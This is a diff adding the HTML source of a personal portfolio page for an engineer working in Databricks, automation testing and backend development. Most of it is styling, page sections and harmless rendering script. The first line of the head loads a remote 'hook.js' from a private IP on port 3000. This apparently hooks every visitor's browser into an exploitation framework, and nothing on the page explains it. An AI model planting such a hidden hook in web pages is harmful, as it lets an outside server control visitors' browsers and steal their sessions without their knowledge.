@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <script src="http://192.168.168.129:3000/hook.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Rithunath V Peter | Databricks Engineer, Automation Testing &amp; Backend developer</title>
+  <meta name="description"
+    content="Portfolio of Rithunath V Peter, an Associate Systems Engineer at TCS working on Databricks, with a background in automation testing, backend development and Java Full Stack training.">
+  <meta property="og:title" content="Rithunath V Peter | Databricks Engineer">
+  <meta property="og:description"
+    content="I build, test, and improve software that works. Automation testing, backend development and data engineering.">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#0d0e12">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@500;700&family=IBM+Plex+Sans:wght@400;500&family=JetBrains+Mono:wght@400&display=swap"
+    rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0d0e12;
+      --surface: #15161c;
+      --surface2: #1b1c24;
+      --line: #2a2c37;
+      --text: #ecebf2;
+      --muted: #a3a5b6;
+      --accent: #a091ff;
+      --accent-ink: #0d0e12;
+      color-scheme: dark;
+      --head: 'Bricolage Grotesque', 'Segoe UI', system-ui, sans-serif;
+      --body: 'IBM Plex Sans', 'Segoe UI', system-ui, sans-serif;
+      --mono: 'JetBrains Mono', ui-monospace, Menlo, Consolas, monospace;
+      box-sizing: border-box;
+      padding-top: env(safe-area-inset-top, 0px);
+      padding-bottom: env(safe-area-inset-bottom, 0px)
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: inherit
+    }
+
+    html {
+      scroll-behavior: smooth;
+      scroll-padding-top: calc(76px + env(safe-area-inset-top, 0px));
+      background: var(--bg)
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font: 400 1rem/1.65 var(--body);
+      -webkit-font-smoothing: antialiased
+    }
+
+    h1,
+    h2,
+    h3 {
+      font-family: var(--head);
+      line-height: 1.1;
+      margin: 0;
+      letter-spacing: -.02em
+    }
+
+    h2 {
+      font-size: clamp(1.8rem, 4vw, 2.6rem);
+      margin-bottom: .6rem
+    }
+
+    h3 {
+      font-size: 1.2rem;
+      letter-spacing: -.01em
+    }
+
+    p {
+      margin: 0 0 1rem;
+      max-width: 66ch
+    }
+
+    a {
+      color: inherit
+    }
+
+    :focus-visible {
+      outline: 2px solid var(--accent);
+      outline-offset: 3px;
+      border-radius: 6px
+    }
+
+    .wrap {
+      width: min(1120px, 100% - 2.5rem);
+      margin-inline: auto
+    }
+
+    section {
+      padding: clamp(4rem, 9vw, 7rem) 0
+    }
+
+    .lead {
+      color: var(--muted);
+      margin-bottom: 2.5rem
+    }
+
+    .ph {
+      color: #e6c875;
+      border-bottom: 1px dashed #e6c87588
+    }
+
+    .skip {
+      position: absolute;
+      left: -999px;
+      top: 0;
+      background: var(--accent);
+      color: var(--accent-ink);
+      padding: .6rem 1rem;
+      z-index: 99
+    }
+
+    .skip:focus {
+      left: 1rem;
+      top: calc(1rem + env(safe-area-inset-top, 0px))
+    }
+
+    /* nav */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0 0 auto;
+      height: env(safe-area-inset-top, 0px);
+      background: rgba(13, 14, 18, .9);
+      z-index: 10
+    }
+
+    header {
+      position: sticky;
+      top: env(safe-area-inset-top, 0px);
+      z-index: 20;
+      background: rgba(13, 14, 18, .86);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--line)
+    }
+
+    nav {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+      height: 64px
+    }
+
+    .logo {
+      font: 700 1.15rem var(--head);
+      text-decoration: none;
+      display: grid;
+      place-items: center;
+      width: 38px;
+      height: 38px;
+      border: 1px solid var(--accent);
+      border-radius: 10px;
+      color: var(--accent)
+    }
+
+    .links {
+      display: flex;
+      gap: .25rem;
+      margin: 0 auto 0 1rem;
+      padding: 0;
+      list-style: none
+    }
+
+    .links a {
+      display: block;
+      padding: .45rem .8rem;
+      border-radius: 8px;
+      text-decoration: none;
+      color: var(--muted);
+      font-size: .95rem;
+      transition: color .2s, background .2s
+    }
+
+    .links a:hover {
+      color: var(--text);
+      background: var(--surface2)
+    }
+
+    .links a[aria-current=true] {
+      color: var(--text);
+      background: var(--surface2);
+      box-shadow: inset 0 -2px 0 var(--accent)
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: .5rem;
+      padding: .7rem 1.2rem;
+      border-radius: 10px;
+      border: 1px solid var(--line);
+      background: transparent;
+      color: var(--text);
+      font: 500 .95rem var(--body);
+      text-decoration: none;
+      cursor: pointer;
+      transition: transform .2s, border-color .2s, background .2s
+    }
+
+    .btn:hover {
+      border-color: var(--accent);
+      transform: translateY(-2px)
+    }
+
+    .btn.pri {
+      background: var(--accent);
+      color: var(--accent-ink);
+      border-color: var(--accent)
+    }
+
+    .btn.pri:hover {
+      background: #b6aaff
+    }
+
+    .menu {
+      display: none;
+      margin-left: auto
+    }
+
+    .nav-cta {
+      padding: .5rem 1rem
+    }
+
+    @media(max-width:860px) {
+      .menu {
+        display: inline-flex
+      }
+
+      .nav-cta {
+        display: none
+      }
+
+      .links {
+        display: none;
+        position: absolute;
+        top: 64px;
+        left: 0;
+        right: 0;
+        flex-direction: column;
+        margin: 0;
+        padding: .75rem 1.25rem 1.25rem;
+        background: var(--bg);
+        border-bottom: 1px solid var(--line)
+      }
+
+      .links.open {
+        display: flex
+      }
+
+      .links a {
+        padding: .8rem
+      }
+    }
+
+    /* hero */
+    .hero {
+      padding-top: clamp(3rem, 7vw, 6rem);
+      display: grid;
+      grid-template-columns: 1.1fr .9fr;
+      gap: 3rem;
+      align-items: center
+    }
+
+    .hero h1 {
+      font-size: clamp(2.6rem, 6.5vw, 4.6rem);
+      margin-bottom: 1.25rem
+    }
+
+    .sub {
+      font: 500 1rem var(--body);
+      color: var(--accent);
+      margin-bottom: 1.25rem
+    }
+
+    .cta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: .75rem;
+      align-items: center;
+      margin-top: 1.75rem
+    }
+
+    .cta .txt {
+      padding: .7rem .4rem;
+      color: var(--muted)
+    }
+
+    .cta .txt:hover {
+      color: var(--text)
+    }
+
+    .win {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      box-shadow: 0 30px 60px -30px rgba(0, 0, 0, .8), 0 0 0 1px rgba(160, 145, 255, .06);
+      overflow: hidden;
+      min-width: 0
+    }
+
+    .bar {
+      display: flex;
+      gap: .4rem;
+      align-items: center;
+      padding: .7rem 1rem;
+      border-bottom: 1px solid var(--line);
+      background: var(--surface2);
+      font: 400 .8rem var(--mono);
+      color: var(--muted)
+    }
+
+    .bar i {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #3a3c4a
+    }
+
+    .bar span {
+      margin-left: .6rem
+    }
+
+    pre {
+      margin: 0;
+      padding: 1.2rem 1.3rem;
+      font: 400 .82rem/1.75 var(--mono);
+      overflow-x: auto;
+      color: #cfd0dd
+    }
+
+    .k {
+      color: #c3b9ff
+    }
+
+    .s {
+      color: #9fd8b0
+    }
+
+    .c {
+      color: #6f7287
+    }
+
+    .cap {
+      padding: .6rem 1.3rem .9rem;
+      color: var(--muted);
+      font-size: .8rem;
+      margin: 0
+    }
+
+    @media(max-width:900px) {
+      .hero {
+        grid-template-columns: 1fr
+      }
+    }
+
+    /* about */
+    .about {
+      display: grid;
+      grid-template-columns: 1.3fr 1fr;
+      gap: 3rem
+    }
+
+    .facts {
+      margin: 0;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      background: var(--surface);
+      padding: .5rem 1.4rem;
+      align-self: start
+    }
+
+    .facts div {
+      padding: .9rem 0;
+      border-bottom: 1px solid var(--line)
+    }
+
+    .facts div:last-child {
+      border: 0
+    }
+
+    .facts dt {
+      color: var(--muted);
+      font-size: .85rem
+    }
+
+    .facts dd {
+      margin: .15rem 0 0
+    }
+
+    @media(max-width:860px) {
+      .about {
+        grid-template-columns: 1fr
+      }
+    }
+
+    /* skills */
+    .legend {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+      margin-bottom: 2rem;
+      color: var(--muted);
+      font-size: .9rem
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 1rem
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      padding: 1.4rem;
+      transition: border-color .25s, transform .25s
+    }
+
+    .card:hover {
+      border-color: #4a4670
+    }
+
+    .card h3 {
+      margin-bottom: .9rem;
+      font-size: 1.05rem
+    }
+
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      padding: 0;
+      margin: 0;
+      list-style: none
+    }
+
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: .45rem;
+      padding: .3rem .7rem;
+      border-radius: 999px;
+      font-size: .88rem;
+      border: 1px solid var(--line);
+      background: var(--surface2)
+    }
+
+    .tag::before {
+      content: "";
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      flex: none
+    }
+
+    .pro::before {
+      background: var(--accent)
+    }
+
+    .fam::before {
+      border: 2px solid var(--accent)
+    }
+
+    .learn {
+      border-style: dashed
+    }
+
+    .learn::before {
+      border: 2px dashed var(--muted)
+    }
+
+    .lg {
+      display: inline-flex;
+      align-items: center;
+      gap: .5rem
+    }
+
+    .lg::before {
+      content: "";
+      width: 9px;
+      height: 9px;
+      border-radius: 50%
+    }
+
+    .lg.pro::before {
+      background: var(--accent)
+    }
+
+    .lg.fam::before {
+      border: 2px solid var(--accent)
+    }
+
+    .lg.learn::before {
+      border: 2px dashed var(--muted)
+    }
+
+    /* timeline */
+    .tl {
+      list-style: none;
+      margin: 0;
+      padding: 0 0 0 1.6rem;
+      border-left: 1px solid var(--line)
+    }
+
+    .tl li {
+      position: relative;
+      padding-bottom: 2.4rem
+    }
+
+    .tl li::before {
+      content: "";
+      position: absolute;
+      left: calc(-1.6rem - 5px);
+      top: .55rem;
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--bg);
+      border: 2px solid var(--accent)
+    }
+
+    .meta {
+      color: var(--muted);
+      font-size: .9rem;
+      margin: .3rem 0 .8rem
+    }
+
+    .tl ul {
+      margin: 0;
+      padding-left: 1.1rem;
+      color: #cfd0dd
+    }
+
+    .tl li li {
+      padding: 0 0 .35rem
+    }
+
+    .tl li li::before {
+      display: none
+    }
+
+    .badge {
+      display: inline-block;
+      font-size: .78rem;
+      padding: .12rem .55rem;
+      border-radius: 6px;
+      border: 1px solid var(--line);
+      color: var(--muted);
+      margin-left: .5rem;
+      vertical-align: middle;
+      font-family: var(--body);
+      font-weight: 500
+    }
+
+    /* projects */
+    .proj {
+      display: flex;
+      flex-direction: column;
+      gap: .7rem
+    }
+
+    .proj:hover {
+      transform: translateY(-4px)
+    }
+
+    .proj p {
+      margin: 0;
+      font-size: .95rem;
+      color: #cfd0dd
+    }
+
+    .proj b {
+      color: var(--text);
+      font-weight: 500
+    }
+
+    .proj .st {
+      align-self: flex-start;
+      font-size: .78rem;
+      padding: .15rem .6rem;
+      border-radius: 6px;
+      border: 1px dashed #e6c87588;
+      color: #e6c875
+    }
+
+    .plinks {
+      margin-top: auto;
+      display: flex;
+      gap: 1rem;
+      font-size: .9rem;
+      padding-top: .6rem
+    }
+
+    .plinks a {
+      color: var(--accent)
+    }
+
+    .plinks .off {
+      color: var(--muted);
+      text-decoration: line-through;
+      text-decoration-color: #555
+    }
+
+    /* contact / footer */
+    .contact {
+      border: 1px solid var(--line);
+      border-radius: 20px;
+      padding: clamp(2rem, 6vw, 4rem);
+      background: linear-gradient(135deg, #1a1830, var(--surface) 60%)
+    }
+
+    .contact h2 {
+      font-size: clamp(2rem, 5vw, 3.2rem);
+      max-width: 18ch
+    }
+
+    footer {
+      border-top: 1px solid var(--line);
+      padding: 2rem 0 3rem;
+      color: var(--muted);
+      font-size: .9rem
+    }
+
+    footer .wrap {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+      justify-content: space-between;
+      align-items: center
+    }
+
+    footer nav {
+      height: auto;
+      gap: 1rem;
+      flex-wrap: wrap
+    }
+
+    footer a {
+      text-decoration: none
+    }
+
+    footer a:hover {
+      color: var(--text)
+    }
+
+    #top {
+      position: fixed;
+      right: 1rem;
+      bottom: calc(1rem + env(safe-area-inset-bottom, 0px));
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      padding: 0;
+      justify-content: center;
+      background: var(--surface);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .25s
+    }
+
+    #top.show {
+      opacity: 1;
+      pointer-events: auto
+    }
+
+    #toast {
+      position: fixed;
+      left: 50%;
+      bottom: calc(5rem + env(safe-area-inset-bottom, 0px));
+      transform: translateX(-50%);
+      background: var(--surface2);
+      border: 1px solid var(--accent);
+      padding: .7rem 1.1rem;
+      border-radius: 10px;
+      font-size: .92rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .25s;
+      max-width: 90vw;
+      z-index: 30
+    }
+
+    #toast.show {
+      opacity: 1
+    }
+
+    #toast.err {
+      border-color: #e68a8a
+    }
+
+    /* motion */
+    .rv {
+      opacity: 0;
+      transform: translateY(14px);
+      transition: opacity .6s ease, transform .6s ease
+    }
+
+    .rv.in {
+      opacity: 1;
+      transform: none
+    }
+
+    .hero>* {
+      animation: up .8s ease both
+    }
+
+    .hero>:nth-child(2) {
+      animation-delay: .15s
+    }
+
+    @keyframes up {
+      from {
+        opacity: 0;
+        transform: translateY(16px)
+      }
+    }
+
+    @media(prefers-reduced-motion:reduce) {
+      html {
+        scroll-behavior: auto
+      }
+
+      * {
+        animation: none !important;
+        transition: none !important
+      }
+
+      .rv {
+        opacity: 1;
+        transform: none
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <a class="skip" href="#main">Skip to content</a>
+  <header>
+    <nav class="wrap" aria-label="Primary">
+      <a class="logo" href="#home" aria-label="Rithunath V Peter, home">RP</a>
+      <ul class="links" id="links">
+        <li><a href="#home">Home</a></li>
+        <li><a href="#about">About</a></li>
+        <li><a href="#skills">Skills</a></li>
+        <li><a href="#experience">Experience</a></li>
+        <li><a href="#projects">Projects</a></li>
+        <li><a href="#contact">Contact</a></li>
+      </ul>
+      <a class="btn pri nav-cta" href="#" data-resume>Download resume</a>
+      <button class="btn menu" id="menu" aria-expanded="false" aria-controls="links"
+        aria-label="Toggle navigation menu">Menu</button>
+    </nav>
+  </header>
+
+  <main id="main">
+    <section id="home" class="wrap hero" style="padding-top:clamp(3rem,7vw,6rem)">
+      <div>
+        <p class="sub">Computer Science Graduate | Automation Testing | Backend Development | Data Engineering</p>
+        <h1>I build, test, and improve software that works.</h1>
+        <p>I’m Rithunath V Peter, an Associate Systems Engineer at TCS working as a Databricks engineer. I bring about
+          one year of automation testing experience, a backend development foundation, Java Full Stack training through
+          TCS ILP, and hands-on work with Databricks, SQL and Apache PySpark.</p>
+        <div class="cta">
+          <a class="btn pri" href="#projects">Explore my work</a>
+          <a class="btn" href="#" data-resume>Download resume</a>
+          <a class="txt" href="#contact">Contact me</a>
+        </div>
+      </div>
+      <figure class="win" style="margin:0" aria-label="Profile summary shown as code">
+        <div class="bar"><i></i><i></i><i></i><span>profile.py</span></div>
+        <pre><code><span class="c"># a summary, not live output</span>
+<span class="k">engineer</span> = {
+  <span class="s">"name"</span>: <span class="s">"Rithunath V Peter"</span>,
+  <span class="s">"role"</span>: <span class="s">"Associate Systems Engineer, TCS"</span>,
+  <span class="s">"working_on"</span>: [<span class="s">"Databricks"</span>, <span class="s">"SQL"</span>, <span class="s">"PySpark"</span>],
+  <span class="s">"foundation"</span>: [
+    <span class="s">"Automation testing (~1 yr)"</span>,
+    <span class="s">"Backend development"</span>,
+    <span class="s">"Java Full Stack (TCS ILP)"</span>,
+  ],
+  <span class="s">"values"</span>: [<span class="s">"reliability"</span>, <span class="s">"clarity"</span>],
+}</code></pre>
+        <figcaption class="cap">Edit this block in the page source to keep it current.</figcaption>
+      </figure>
+    </section>
+
+    <section id="about">
+      <div class="wrap about rv">
+        <div>
+          <h2>About me</h2>
+          <p>I studied Computer Science and Engineering, then started my career in automation testing. Writing Selenium
+            and Playwright suites, running load tests with Locust and scanning with OWASP ZAP taught me how software
+            fails, and what it takes to make it dependable.</p>
+          <p>That curiosity pulled me toward the systems behind the tests: Spring Boot and Node.js backends through my
+            Java Full Stack training, and now data pipelines with Databricks, SQL and PySpark at TCS. I like
+            understanding a product end to end, from the code that builds it to the checks that prove it works.</p>
+          <p>I learn quickly, work in a disciplined way, and ask for feedback early.</p>
+        </div>
+        <dl class="facts">
+          <div>
+            <dt>Education</dt>
+            <dd>B.Tech, Computer Science and Engineering</dd>
+          </div>
+          <div>
+            <dt>Experience</dt>
+            <dd>About 1 year in automation testing, plus current role at TCS</dd>
+          </div>
+          <div>
+            <dt>Focus areas</dt>
+            <dd>Data engineering,Automation testing, Backend development</dd>
+          </div>
+          <div>
+            <dt>Currently learning</dt>
+            <dd>Apache PySpark, Databricks, Machine learning</dd>
+          </div>
+          <div>
+            <dt>Location</dt>
+            <dd><span class="ph">Kakkanad - Kochi, India</span></dd>
+          </div>
+        </dl>
+      </div>
+    </section>
+
+    <section id="skills">
+      <div class="wrap">
+        <h2 class="rv">Technical skills</h2>
+        <p class="lead rv">Grouped by area, and marked by how I’ve used each one rather than by a score.</p>
+        <div class="legend rv"><span class="lg pro">Used professionally</span><span class="lg fam">Practical
+            familiarity</span><span class="lg learn">Currently learning</span></div>
+        <div class="grid" id="skillGrid"></div>
+      </div>
+    </section>
+
+    <section id="experience">
+      <div class="wrap">
+        <h2 class="rv">Experience and journey</h2>
+        <p class="lead rv">Yellow dashed text marks details for you to replace with verified information.</p>
+        <ol class="tl" id="timeline"></ol>
+      </div>
+    </section>
+
+    <section id="projects">
+      <div class="wrap">
+        <h2 class="rv">Featured projects</h2>
+        <p class="lead rv">These are sample project concepts matched to my skill set. Each is labelled with its status,
+          and links appear only once real URLs are added.</p>
+        <div class="grid" id="projGrid" style="grid-template-columns:repeat(auto-fit,minmax(300px,1fr))"></div>
+      </div>
+    </section>
+
+    <section id="education">
+      <div class="wrap">
+        <h2 class="rv">Education and training</h2>
+        <div class="grid rv" style="margin-top:1.5rem">
+          <div class="card">
+            <h3>B.Tech, Computer Science and Engineering</h3>
+            <p class="meta"><span class="ph">College Of Engineering, Chengannur </span>, <span class="ph">2025</span></p>
+            <p style="margin:0;color:#cfd0dd">Foundation in Java,Python,C, Data Structures and SQl</p>
+          </div>
+          <div class="card">
+            <h3>Java Full Stack Development <span class="badge">Training</span></h3>
+            <p class="meta">TCS ILP, <span class="ph">june 4th - august 21st</span></p>
+            <p style="margin:0;color:#cfd0dd">Training in Java, Spring Boot and web development fundamentals. Completed
+              as a learning programme.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="mindset">
+      <div class="wrap">
+        <h2 class="rv">How I work and learn</h2>
+        <div class="grid rv" style="margin-top:1.5rem">
+          <div class="card">
+            <h3>Fundamentals first</h3>
+            <p style="margin:0;color:#cfd0dd">I learn how a tool works underneath before relying on it, which is how I’m
+              approaching PySpark and Databricks.</p>
+          </div>
+          <div class="card">
+            <h3>Quality as a habit</h3>
+            <p style="margin:0;color:#cfd0dd">Testing taught me to think about failure, performance and security while
+              building, not after.</p>
+          </div>
+          <div class="card">
+            <h3>Maintainable code</h3>
+            <p style="margin:0;color:#cfd0dd">Readable structure, small reusable pieces and clear naming, so others can
+              pick up my work.</p>
+          </div>
+          <div class="card">
+            <h3>Feedback and range</h3>
+            <p style="margin:0;color:#cfd0dd">I seek reviews early and keep widening my skills across backend, data and
+              machine learning.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="contact">
+      <div class="wrap">
+        <div class="contact rv">
+          <h2>Have a project or opportunity in mind? Let’s connect.</h2>
+          <p style="color:var(--muted)">Email is the quickest way to reach me.</p>
+          <div class="cta">
+            <a class="btn pri" id="mail" href="#">Send an email</a>
+            <button class="btn" id="copy" type="button">Copy email</button>
+            <a class="btn" id="li" href="#" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+            <a class="btn" id="gh" href="#" target="_blank" rel="noopener noreferrer">GitHub</a>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <div><strong style="color:var(--text)">Rithunath V Peter</strong><br>Building reliable software, one test at a
+        time.</div>
+      <nav aria-label="Footer"><a href="#about">About</a><a href="#skills">Skills</a><a
+          href="#experience">Experience</a><a href="#projects">Projects</a><a href="#contact">Contact</a></nav>
+      <div>© <span id="yr"></span> Rithunath V Peter</div>
+    </div>
+  </footer>
+
+  <button class="btn" id="top" aria-label="Back to top">↑</button>
+  <div id="toast" role="status" aria-live="polite"></div>
+
+  <script>
+    /* ===== EDIT ME: replace these placeholders ===== */
+    const CONFIG = {
+      email: "your.rithunathtpc2024@gmail.com",
+      linkedin: "https://www.linkedin.com/in/rithunath-vpeter/",
+      github: "https://github.com/Rithunath69/Rithunath69/blob/main/README.md",
+      resume: "" /* paste a hosted PDF URL here */
+    };
+    const SKILLS = [
+      ["Automation testing", [["Selenium", "pro"], ["Playwright", "pro"]]],
+      ["Performance testing", [["Locust", "pro"]]],
+      ["Security testing", [["OWASP ZAP", "pro"]]],
+      ["Test management", [["Jira", "pro"]]],
+      ["Programming languages", [["Python", "pro"], ["SQL", "pro"], ["Java", "fam"], ["JavaScript", "fam"]]],
+      ["Backend development", [["Spring Boot", "fam"], ["Node.js", "fam"], ["Express.js", "fam"]]],
+      ["Frontend development", [["HTML", "fam"], ["CSS", "fam"], ["JavaScript", "fam"]]],
+      ["Data technologies", [["Databricks", "pro"], ["SQL", "pro"], ["Apache PySpark", "learn"]]],
+      ["Additional knowledge", [["API testing", "pro"], ["Functional testing", "pro"], ["Software QA", "pro"], ["Machine learning", "fam"]]]
+    ];
+    const ph = t => `<span class="ph">[${t}]</span>`;
+    const JOURNEY = [
+      { t: "Associate Systems Engineer, Databricks Engineer", o: "Tata Consultancy Services (TCS)", d: ph("september 2026") + " to Present", b: ["Working as a Databricks engineer, using SQL and Apache PySpark."] },
+      { t: "Automation Testing Engineer", o: ph("Reizend PVT LTD") + " · " + ph("Test and Implementation Engineer"), d: "About 1 year · " + ph("June 9 2025 - 21 May 2026") + " · " + ph("Technopark - Trivandrum"), b: ["Automated browser tests with Selenium and Playwright.", "Ran performance tests with Locust and security scans with OWASP ZAP.", "Tracked defects and test work in Jira."] },
+      { t: "Java Full Stack Development", badge: "Training", o: "TCS ILP", d: ph("June 4th - August 21st"), b: ["Training in Java, Spring Boot and web fundamentals. This was a training programme, not employment."] }
+    ];
+    const PROJECTS = [
+      { n: "Browser Automation Framework", st: "Sample concept", p: "UI tests become hard to maintain when scripts are duplicated and reports are scattered.", s: "A reusable Selenium or Playwright framework with page objects, shared fixtures and readable reports.", k: ["Page object structure", "Reusable test data", "HTML reporting"], tech: ["Python", "Selenium", "Playwright"] },
+      { n: "Data Quality Pipeline", st: "Sample concept", p: "Raw data needs cleaning and validation before anyone can trust it.", s: "A SQL and PySpark workflow on Databricks that transforms a sample dataset and checks its quality.", k: ["Transformations in PySpark", "SQL validation checks", "Databricks notebook"], tech: ["Databricks", "PySpark", "SQL"] },
+      { n: "API Test and Load Toolkit", st: "Planned", p: "APIs need both correctness checks and evidence of how they behave under load.", s: "Automated API validation plus Locust load scenarios, run against a sample service I control.", k: ["Assertions and test data", "Locust scenarios", "Run summaries"], tech: ["Python", "Locust", "REST"] },
+      { n: "Java Full Stack Application", st: "Planned", p: "A practical way to apply backend and frontend skills together.", s: "A Spring Boot REST API with validation, database integration and a simple web frontend.", k: ["REST endpoints", "Input validation", "Database layer"], tech: ["Java", "Spring Boot", "JavaScript"] }
+    ].map(x => ({ ...x, gh: "", demo: "" }));
+
+    const $ = s => document.querySelector(s);
+    const esc = s => s;
+    $("#skillGrid").innerHTML = SKILLS.map(([g, t]) => `<div class="card rv"><h3>${g}</h3><ul class="tags">${t.map(([n, l]) => `<li class="tag ${l}">${n}</li>`).join("")}</ul></div>`).join("");
+    $("#timeline").innerHTML = JOURNEY.map(j => `<li class="rv"><h3>${j.t}${j.badge ? `<span class="badge">${j.badge}</span>` : ""}</h3><p class="meta">${j.o}<br>${j.d}</p><ul>${j.b.map(x => `<li>${x}</li>`).join("")}</ul></li>`).join("");
+    const link = (u, l) => u ? `<a href="${u}" target="_blank" rel="noopener noreferrer">${l}</a>` : `<span class="off" title="Add a real URL to enable">${l}</span>`;
+    $("#projGrid").innerHTML = PROJECTS.map(p => `<article class="card proj rv"><span class="st">${p.st}, editable</span><h3>${p.n}</h3><p><b>Problem.</b> ${p.p}</p><p><b>Solution.</b><ul class="tags">${p.k.map(k => `<li class="tag" style="font-size:.8rem">${k}</li>`).join("")}</ul><p style="color:var(--muted)">${p.tech.join(", ")}</p><div class="plinks">${link(p.gh, "GitHub")}${link(p.demo, "Live demo")}</div></article>`).join("");
+
+    /* toast */
+    const toast = $("#toast"); let tt;
+    function say(m, err) { toast.textContent = m; toast.className = "show" + (err ? " err" : ""); clearTimeout(tt); tt = setTimeout(() => toast.className = "", 3200) }
+    /* links */
+    $("#mail").href = "mailto:" + CONFIG.email; $("#li").href = CONFIG.linkedin; $("#gh").href = CONFIG.github;
+    $("#copy").onclick = async () => { try { await navigator.clipboard.writeText(CONFIG.email); say("Email copied to clipboard.") } catch (e) { say("Couldn’t copy automatically. Email: " + CONFIG.email, true) } };
+    document.querySelectorAll("[data-resume]").forEach(a => {
+      if (CONFIG.resume) { a.href = CONFIG.resume; a.target = "_blank"; a.rel = "noopener noreferrer" }
+      else a.addEventListener("click", e => { e.preventDefault(); say("Résumé not added yet. Set CONFIG.resume in the page source.", true) });
+    });
+    /* menu */
+    const menu = $("#menu"), links = $("#links");
+    menu.onclick = () => { const o = links.classList.toggle("open"); menu.setAttribute("aria-expanded", o) };
+    links.addEventListener("click", e => { if (e.target.closest("a")) { links.classList.remove("open"); menu.setAttribute("aria-expanded", "false") } });
+    document.addEventListener("keydown", e => { if (e.key === "Escape" && links.classList.contains("open")) { links.classList.remove("open"); menu.setAttribute("aria-expanded", "false"); menu.focus() } });
+    /* active section + reveal */
+    const navA = [...links.querySelectorAll("a")];
+    const so = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) { navA.forEach(a => a.setAttribute("aria-current", a.getAttribute("href") === "#" + e.target.id)) } }), { rootMargin: "-45% 0px -50% 0px" });
+    document.querySelectorAll("section[id]").forEach(s => so.observe(s));
+    const ro = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add("in"); ro.unobserve(e.target) } }), { threshold: .1 });
+    document.querySelectorAll(".rv").forEach(el => ro.observe(el));
+    /* top + year */
+    const toTop = $("#top"); addEventListener("scroll", () => toTop.classList.toggle("show", scrollY > 600), { passive: true });
+    toTop.onclick = () => scrollTo({ top: 0 });
+    $("#yr").textContent = new Date().getFullYear();
+  </script>
+</body>
+
+</html>
